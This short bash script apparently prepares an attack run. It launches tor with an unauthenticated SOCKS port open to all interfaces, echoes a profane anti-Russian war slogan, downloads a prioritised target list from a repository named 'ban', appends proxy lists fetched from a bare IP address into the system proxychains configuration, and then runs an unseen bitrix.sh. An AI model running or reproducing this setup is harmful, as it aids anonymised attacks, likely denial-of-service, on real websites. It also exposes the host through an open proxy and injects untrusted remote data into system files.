#!/bin/bash

tor --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "" --SocksPort 0.0.0.0:9050

echo "российский военній корабль, иди на хуй!"

wget https://github.com/imsamurai/ban/raw/master/data/ph_priority.txt
curl -s "http://143.244.166.15/proxy-fast.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
curl -s "http://143.244.166.15/proxy.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf

./bitrix.sh
